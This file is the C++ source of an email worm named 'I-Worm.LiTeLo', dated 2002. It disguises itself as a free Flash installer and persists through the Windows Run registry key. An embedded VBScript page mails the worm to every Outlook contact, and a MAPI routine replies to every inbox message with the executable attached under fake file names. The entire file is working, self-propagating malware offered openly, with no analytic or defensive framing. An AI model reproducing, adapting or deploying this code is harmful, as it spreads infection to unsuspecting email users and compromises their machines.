/*
Name : I-Worm.LiTeLo
Author : PetiK
Date : March 7th 2002 - March 10th 2002
Language : C++/HTML
*/

#include <stdio.h>
#include <windows.h>
#include <mapi.h>
#pragma argused

char    filename[50],copysys[50],copyreg[50],htmf[50],fakemess[1024];
LPSTR   Run="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    Uninst="Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\LiteLo";
char    dn[20]="Flash32 Uninstall",ust[40];
BYTE    htmail[10];
DWORD   Tmp,type=REG_SZ,shtmail=sizeof(htmail);
LPTSTR  cmdLine,ptr;
BOOL    installed,uninstall;
HMODULE kernel32;
FILE    *htm;

LHANDLE session;
MapiMessage *mess;
HINSTANCE WiNet,hMAPI;
char messId[512],mname[50],maddr[30];


char    htmms[]="<html><head><title>Flash Information</title></head>\n"
        "<body><script language=vbscript>\n"
        "On Error Resume Next\n"
        "msgbox \"Please accept ActiveX by clicking YES\",vbinformation,\"Flash32 NET\"\n"
        "Set abcgqlbg=CreateObject(\"Scripting.FileSystemObject\")\n"
        "Set gqlbgrlb=CreateObject(\"WScript.Shell\")\n\n"
        "If err.number=429 Then\n"
        "gqlbgrlb.Run javascript:location.reload()\n\n"
        "Else\n\n"
        "mess=\"Contact :\"\n"
        "Set bgqlbgqm=CreateObject(\"Outlook.Application\")\n"
        "Set mbgqlbgq=bgqlbgqm.GetNameSpace(\"MAPI\")\n"
        "For Each C In mbgqlbgq.AddressLists\n"
        "If C.AddressEntries.Count <> 0 Then\n"
        "For D=1 To C.AddressEntries.Count\n"
        "Set qlbgqlbg=C.AddressEntries(D)\n"
        "Set gqlcgqlb=bgqlbgqm.CreateItem(0)\n"
        "mess=mess &vbCrLf& qlbgqlbg.Address\n"
        "gqlcgqlb.To=qlbgqlbg.Address\n"
        "gqlcgqlb.Subject=\"New Version of Flash.\"\n"
        "gqlcgqlb.Body=\"Unlimited demo verion of Flash.\"\n"
        "gqlcgqlb.Attachments.Add(abcgqlbg.GetSpecialFolder(1)&\"\\Flash32.exe\")\n"
        "gqlcgqlb.DeleteAfterSubmit=True\n"
        "If gqlcgqlb.To <> \"\" Then\n"
        "gqlcgqlb.Send\n"
        "End If\n"
        "Next\n"
        "End If\n"
        "Next\n\n"
        "MsgBox mess,vbinformation,\"Flash Contact\"\n"
        "gqlbgrlb.RegWrite \"HKLM\\Software\\Microsoft\\HTMail\",\"OK\"\n"
        "gqlbgrlb.Run javascript:location.href=(\"http://www.flash.com\")\n"
        "End If\n"
        "</script></body></html>";

char *attname[]={"flash32.exe","flsh32eng.exe","flsh32fr.exe","new_flash.exe",
        "freeflash32.exe","installflash.exe","setupflash.exe"};

HKEY        hReg;
SYSTEMTIME  systime;

BOOL (PASCAL FAR *INetConnect)(LPDWORD flags,DWORD reserved);
ULONG (PASCAL FAR *RegSerPro)(ULONG, ULONG);
ULONG (PASCAL FAR *mSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogoff)(LHANDLE, ULONG, FLAGS, ULONG);
ULONG (PASCAL FAR *mLogon)(ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPLHANDLE);
ULONG (PASCAL FAR *mFindNext)(LHANDLE, ULONG, LPTSTR, LPTSTR, FLAGS, ULONG, LPTSTR);
ULONG (PASCAL FAR *mReadMail)(LHANDLE, ULONG, LPTSTR, FLAGS, ULONG, lpMapiMessage FAR *);
ULONG (PASCAL FAR *mFreeBuffer)(LPVOID);

int WINAPI WinMain (HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
{

kernel32=GetModuleHandle("KERNEL32.DLL");
if(kernel32) {
    (FARPROC &)RegSerPro=GetProcAddress(kernel32,"RegisterServiceProcess");
    if(RegSerPro)
    RegSerPro(NULL,1);
    }

GetModuleFileName(hInst,filename,100);
GetSystemDirectory((char *)copysys,100);
strcpy(htmf,copysys);
strcat(copysys,"\\Flash32.exe");
strcat(htmf,"\\FlashNet.htm");

installed=FALSE;
uninstall=FALSE;
cmdLine=GetCommandLine();
if(cmdLine) {
    for(ptr=cmdLine;ptr[0]!='-' && ptr[1]!=0;ptr++);
    if(ptr[0]=='-' && ptr[1]!=0) {
        switch(ptr[1]) {
            default:
            break;
            case 'i':
                installed=TRUE;
                break;
            case 'u':
                installed=TRUE;
                uninstall=TRUE;
                break;
            }
        }
    }

if(!installed) {
    CopyFile(filename,copysys,FALSE);
    strcpy(copyreg,copysys);
    strcat(copyreg," -i");
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_WRITE,&hReg);
    RegSetValueEx(hReg,"Flash32",0,REG_SZ,(BYTE *)copyreg,100);
    RegCloseKey(hReg);

    strcpy(ust,copysys);
    strcat(ust," -u");
    RegCreateKey(HKEY_LOCAL_MACHINE,Uninst,&hReg);
    RegSetValueEx(hReg,"DisplayName",0,REG_SZ,(BYTE *)dn,20);
    RegSetValueEx(hReg,"UninstallString",0,REG_SZ,(BYTE *)ust,40);
    RegCloseKey(hReg);

    htm=fopen(htmf,"w");
    fprintf(htm,"%s",htmms);
    fclose(htm);

        MessageBox(NULL,"Error : cannot open flash32.dll","ERROR",MB_OK|MB_ICONSTOP);
    ExitProcess(0);
    }

if(uninstall) {
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,Run,0,KEY_ALL_ACCESS,&hReg);
    RegDeleteValue(hReg,"Flash32");
    RegCloseKey(hReg);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall",0,KEY_ALL_ACCESS,&hReg);
    RegDeleteKey(hReg,"LiteLo");
    RegCloseKey(hReg);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft",0,KEY_ALL_ACCESS,&hReg);
    RegDeleteValue(hReg,"HTMail");
    RegCloseKey(hReg);
    DeleteFile(htmf);
    WritePrivateProfileString("rename","NUL",copysys,"WININIT.INI");
    MessageBox(NULL,"Please restart the system.","Uninstall Flash32",MB_OK|MB_ICONHAND);
    ExitWindowsEx(EWX_REBOOT|EWX_FORCE,0);
    ExitProcess(0);
    }

// Check if we are connected
WiNet=LoadLibrary("WININET.DLL");
if(!WiNet) {
    goto cworm;
    }
(FARPROC &)INetConnect=GetProcAddress(WiNet, "InternetGetConnectedState");
if(!INetConnect) {
    FreeLibrary(WiNet);
    goto cworm;
    }
while(INetConnect(&Tmp,0)!=TRUE) {
    Sleep(1000);
    }
FreeLibrary(WiNet);

RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft",0,KEY_QUERY_VALUE,&hReg);
RegQueryValueEx(hReg,"HTMail",0,&type,htmail,&shtmail);
RegCloseKey(hReg);
if(strcmp(htmail,"OK")!=0) {
    ShellExecute(NULL,"open",htmf,NULL,NULL,SW_SHOWMAXIMIZED);
    }


cworm:
hMAPI=LoadLibrary("MAPI32.DLL");
(FARPROC &)mLogon=GetProcAddress(hMAPI, "MAPILogon");
(FARPROC &)mLogoff=GetProcAddress(hMAPI, "MAPILogoff");
(FARPROC &)mFindNext=GetProcAddress(hMAPI, "MAPIFindNext");
(FARPROC &)mReadMail=GetProcAddress(hMAPI, "MAPIReadMail");
(FARPROC &)mSendMail=GetProcAddress(hMAPI, "MAPISendMail");
(FARPROC &)mFreeBuffer=GetProcAddress(hMAPI, "MAPIFreeBuffer");
mLogon(NULL,NULL,NULL,MAPI_NEW_SESSION,NULL,&session);
if(mFindNext(session,0,NULL,NULL,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS) {
  do {
     if(mReadMail(session,NULL,messId,MAPI_ENVELOPE_ONLY|MAPI_PEEK,NULL,&mess)==SUCCESS_SUCCESS) {
    strcpy(mname,mess->lpOriginator->lpszName);
    strcpy(maddr,mess->lpOriginator->lpszAddress);
    mess->ulReserved=0;
    mess->lpszSubject="New! New! Version of Flash";
    mess->lpszNoteText="Hi,\nLook at this demo version of Flash.\n\nIt's easy and free.";
    mess->lpszMessageType=NULL;
    mess->lpszDateReceived=NULL;
    mess->lpszConversationID=NULL;
    mess->flFlags=MAPI_SENT;
    mess->lpOriginator->ulReserved=0;
    mess->lpOriginator->ulRecipClass=MAPI_ORIG;
    mess->lpOriginator->lpszName=mess->lpRecips->lpszName;
    mess->lpOriginator->lpszAddress=mess->lpRecips->lpszAddress;
    mess->nRecipCount=1;
    mess->lpRecips->ulReserved=0;
    mess->lpRecips->ulRecipClass=MAPI_TO;
    mess->lpRecips->lpszName=mname;
    mess->lpRecips->lpszAddress=maddr;
    mess->nFileCount=1;
    mess->lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
    memset(mess->lpFiles, 0, sizeof(MapiFileDesc));
    mess->lpFiles->ulReserved=0;
    mess->lpFiles->flFlags=NULL;
    mess->lpFiles->nPosition=-1;
    mess->lpFiles->lpszPathName=filename;
    mess->lpFiles->lpszFileName=attname[GetTickCount()&6];
    mess->lpFiles->lpFileType=NULL;
    mSendMail(session, NULL, mess, NULL, NULL);
    }
  }while(mFindNext(session,0,NULL,messId,MAPI_LONG_MSGID,NULL,messId)==SUCCESS_SUCCESS);
free(mess->lpFiles);
mFreeBuffer(mess);
mLogoff(session,0,0,0);
FreeLibrary(hMAPI);
}


}
